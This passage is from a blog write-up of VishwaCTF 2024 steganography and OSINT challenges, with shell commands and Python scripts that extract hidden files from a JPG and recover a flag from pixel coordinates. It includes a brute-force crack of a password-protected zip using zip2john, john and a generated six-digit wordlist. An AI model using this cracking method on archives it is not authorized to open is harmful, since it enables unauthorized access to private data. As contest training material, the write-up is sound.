+<p>here are some exif infos that caught my attention i.e. <strong>Genre, Band, Comment</strong> and <strong>User Defined URL</strong>, in URL we have given drive file link that is log zip file named <strong>flight_logs.zip</strong> that is encrypted.</p>
+<p>and comments says <strong>password for the zip is all lowecase with no spaces</strong> but we don’t even have password till now</p>
+<p>and if you see <strong>Band</strong> it has value <strong>DB Cooper</strong> i searched it on google and got to know that its a person name who <strong>hijacked Northwest Orient Airlines Flight 305, a Boeing 727 aircraft, in United States airspace on November 24, 1971.</strong> </p>
+<p>and because our file name is flight_log.zip its connecting our insights that we are in right directions</p>
+<p>i tried some passwords from exif info but no use but i had all info about DB Cooper in wikipedia the major one is the one that i mentioned above so then i tried name of the flight that is <strong>Northwest Orient Airlines Flight</strong> as passsword <strong>northwestorientairlines</strong> and it worked indeed.</p>
+<p>now if we look inside folder we have thousand of log file and thats intimidating but there very simple logic of mine worked, that is i sorted out all the file on the basis of their size i.e. </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">ls</span> -lSh | <span class="built_in">head</span></span><br><span class="line">total 7.4G</span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x  14M Feb 26 12:25 Flight-305.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:09 Flight-2270.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:05 Flight-448. <span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:11 Flight-4551.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:05 Flight-533. <span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:10 Flight-5358.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:11 Flight-6294.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:05 Flight-651. <span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:11 Flight-6867.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+
+<p>so if you look at the list the first one is <strong>Flight-305.log</strong> and thats the desired one</p>
+<p>and i contains around some 30,0000 lines if you scroll it gradually you’ll gonna see the part of flag, so either we can grab it one by one or filter it using <strong>regex</strong> and <strong>tr</strong> e.g.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -v <span class="string">&#x27;^1971-11-24.*727$&#x27;</span> Flight-305.<span class="built_in">log</span> | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27; &#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27; &#x27;</span></span><br><span class="line">VishwaCTF&#123;1_W!LL_3E_B@CK&#125;   </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>BTW we could have find the targeted log file simply by the number of filght that is mentioned in wikipedia i.e. <strong>Flight 305</strong></p>
+</blockquote>
+<h3 id="Secret-Code"><a href="#Secret-Code" class="headerlink" title="Secret Code"></a>Secret Code</h3><h4 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>Akshay has a letter for you and need your help</p>
+</blockquote>
+<p>two files <strong>confidential.jpg</strong> and <strong>letter.txt</strong></p>
+<p>cating letter.txt says</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">To,</span><br><span class="line">VishwaCTF<span class="string">&#x27;24 Participant</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I am Akshay, an ex employee at a Tech firm. Over all the years, I have been trading Cypto currencies and made a lot of money doing that. Now I want to withdraw my money, but I&#x27;</span>ll be charged a huge tax <span class="keyword">for</span> the transaction <span class="keyword">in</span> my country.</span><br><span class="line"></span><br><span class="line">I got to know that you are a <span class="built_in">nice</span> person and also your country doesn<span class="string">&#x27;t charge any tax so I need your help. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I want you to withdraw the money and hand over to me. But I feel some hackers are spying on my internet activity, so I am sharing this file with you. Get the password and withdraw it before the hackers have the access to my account.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your friend,</span></span><br><span class="line"><span class="string">Akshay</span></span><br></pre></td></tr></table></figure>
+
+<p>no useful information here, then i started working on jpg file and if you below strings it contains some more files inside itself , you can extract it is using <strong>foremost</strong> and some time <strong>unzip</strong> works as well.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ strings -10 confidential.jpg            </span><br><span class="line"><span class="string">&#x27;9=82&lt;.342</span></span><br><span class="line"><span class="string">!22222222222222222222222222222222222222222222222222</span></span><br><span class="line"><span class="string">%&amp;&#x27;</span>()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span><br><span class="line">&amp;<span class="string">&#x27;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span></span><br><span class="line"><span class="string">5ecr3t_c0de.zip</span></span><br><span class="line"><span class="string">5ecr3t_c0de.txt</span></span><br><span class="line"><span class="string">:Ca&amp;;hhyy*;</span></span><br><span class="line"><span class="string">7&lt;;P&gt;wUr;3</span></span><br><span class="line"><span class="string">:`Nw(HOR7A</span></span><br><span class="line"><span class="string">utHV&lt;=UC|Z</span></span><br><span class="line"><span class="string">helper.txtM</span></span><br><span class="line"><span class="string">5ecr3t_c0de.zip</span></span><br><span class="line"><span class="string">helper.txt            </span></span><br></pre></td></tr></table></figure>
+
+<p>so here helper.txt says </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> helper.txt </span><br><span class="line">Hey buddy, I<span class="string">&#x27;m really sorry if this takes long for you to get the password. But it&#x27;</span>s a matter of <span class="variable">$10</span>,000,000 so I can<span class="string">&#x27;t risk it out.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;I really can&#x27;</span>t remember the password <span class="keyword">for</span> zip. All I can remember is it was a 6 digit number. Hope you can figure it out easily<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>now <strong>5ecr3t_c0de.zip</strong> is protected and password possiblity is any 6 digit numbers within 999999 we can brute force it using <strong>john</strong></p>
+<p>script for generating all possible 6 digits numbers</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_combinations</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;possible_combinations.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">            combination = <span class="built_in">str</span>(i).zfill(<span class="number">6</span>) </span><br><span class="line">            file.write(combination + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_combinations()</span><br></pre></td></tr></table></figure>
+
+<p>john command </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(zr0x㉿pwn3r)-[~/…/vishwaCTF-2024/steg/03_Secret_Code/tmp]</span><br><span class="line">└─$ zip2john 5ecr3t_c0de.zip &gt; secret.hash  </span><br><span class="line"></span><br><span class="line">┌──(zr0x㉿pwn3r)-[~/…/vishwaCTF-2024/steg/03_Secret_Code/tmp]</span><br><span class="line">└─$ john secret.hash --wordlist=../possible_combinations.txt</span><br></pre></td></tr></table></figure>
+
+<p>after unzipping we got two files i.e. <strong>5ecr3t_c0de.txt</strong> and <strong>info.txt</strong></p>
+<p>info.txt</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What are these random numbers? Is it related to the given image? Maybe you should find it out by yourself</span><br></pre></td></tr></table></figure>
+
+<p>5ecr3t_c0de.txt</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> 5ecr3t_c0de.txt|<span class="built_in">head</span></span><br><span class="line">(443, 1096)</span><br><span class="line">(444, 1096)</span><br><span class="line">(445, 1096)</span><br><span class="line">(3220, 1096)</span><br><span class="line">(3221, 1096)</span><br><span class="line">(38, 1097)</span><br><span class="line">(39, 1097)</span><br><span class="line">(43, 1097)</span><br><span class="line">(80, 1097)</span><br><span class="line">(81, 1097)</span><br><span class="line">............</span><br><span class="line">............</span><br></pre></td></tr></table></figure>
+
+<p>so if see info and 5ecr3t_c0de we can infer that given numbers are the coordinates likely indicate positions of pixels within the image.<br>they are probably in (x, y) order, representing horizontal (x) and vertical (y) coordinates. or height and width sequentially.</p>
+<p>so anticipation is that we have given a blank black jpg images and these are flag coordinates which will create or show flag and most probably in white </p>
+<p>we can use this script for that </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_coordinates</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        coordinates = [<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, line.strip(<span class="string">&#x27;()\n&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>))) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line">    <span class="keyword">return</span> coordinates</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_white_pixels</span>(<span class="params">image_path, coordinates, output_path</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates:</span><br><span class="line">        img.putpixel(coord, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))  <span class="comment"># RGB value for white</span></span><br><span class="line">    img.save(output_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Done, check : <span class="subst">&#123;output_path&#125;</span>.&quot;</span>)</span><br><span class="line"></span><br><span class="line">image_path = <span class="string">&#x27;/confidential.jpg&#x27;</span></span><br><span class="line">file_path = <span class="string">&#x27;/5ecr3t_c0de.txt&#x27;</span></span><br><span class="line">output_path = <span class="string">&#x27;output_image.png&#x27;</span></span><br><span class="line"></span><br><span class="line">coordinates = read_coordinates(file_path)</span><br><span class="line">draw_white_pixels(image_path, coordinates, output_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>and here we go</p>
+<p><img src="/imgs/post7/steg/secret_flag.png" alt="secret_flag.png"></p>
+<h2 id="OSINT-1"><a href="#OSINT-1" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Sagar-Sangram"><a href="#Sagar-Sangram" class="headerlink" title="Sagar Sangram"></a>Sagar Sangram</h3><p><img src="/imgs/post7/steg/sangram_desc.png" alt="sangram_desc.png"></p>
+<p>with that sort tale description we have given descord server to join as well.</p>
+<p>so if you are indian and know Indian mythological story then after reading this you’ll figure it aobut instantly that here its about The <strong>Samudra Manthana</strong> that is a major episode in Hinduism that is elaborated in the Vishnu Purana, a major text of Hinduism.</p>
+<p>so when hop in the server we have given some instruction in rule section where we have to chat with a <strong>bot</strong> and answer some questions that is all regarding  <strong>Samudra Manthana</strong> and if you manage to answer those all we will be given the flag at last.</p>
+<p><img src="/imgs/post7/osint/sagar_sangram.gif" alt="sagar_sangram.gif"></p>
+<p>Flag :</p>
+<p><code>VishwaCTF&#123;karmany-evadhikaras te ma phaleshu kadachana ma karma-phala-hetur bhur ma te sango stvakarmani&#125;</code></p>
+<h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><p>yet to do …………</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archive">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Save-The-City"><span class="toc-number">1.1.</span> <span class="toc-text">Save The City</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-number">1.1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trip-To-Us"><span class="toc-number">1.2.</span> <span class="toc-text">Trip To Us</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#They-Are-Coming"><span class="toc-number">1.3.</span> <span class="toc-text">They Are Coming</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">2.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-end-is-beginning"><span class="toc-number">2.1.</span> <span class="toc-text">The end is beginning</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-3"><span class="toc-number">2.1.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TRY-HACK-ME"><span class="toc-number">2.2.</span> <span class="toc-text">TRY HACK ME</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Discription"><span class="toc-number">2.2.1.</span> <span class="toc-text">Discription</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ifconfig-inet"><span class="toc-number">2.3.</span> <span class="toc-text">ifconfig_inet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-4"><span class="toc-number">2.3.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-CTF"><span class="toc-number">3.</span> <span class="toc-text">Post CTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steg"><span class="toc-number">4.</span> <span class="toc-text">Steg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#We-Are-Valorant"><span class="toc-number">4.1.</span> <span class="toc-text">We Are Valorant</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-5"><span class="toc-number">4.1.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysterious-Old-Case"><span class="toc-number">4.2.</span> <span class="toc-text">Mysterious Old Case</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-6"><span class="toc-number">4.2.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secret-Code"><span class="toc-number">4.3.</span> <span class="toc-text">Secret Code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-7"><span class="toc-number">4.3.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-1"><span class="toc-number">5.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sagar-Sangram"><span class="toc-number">5.1.</span> <span class="toc-text">Sagar Sangram</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensics"><span class="toc-number">5.2.</span> <span class="toc-text">Forensics</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&text=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&is_video=false&description=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF WriteUp: VishwaCTF 2024&body=Check out this article: https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&name=CTF WriteUp: VishwaCTF 2024&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&t=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    Durgesh
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archive">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
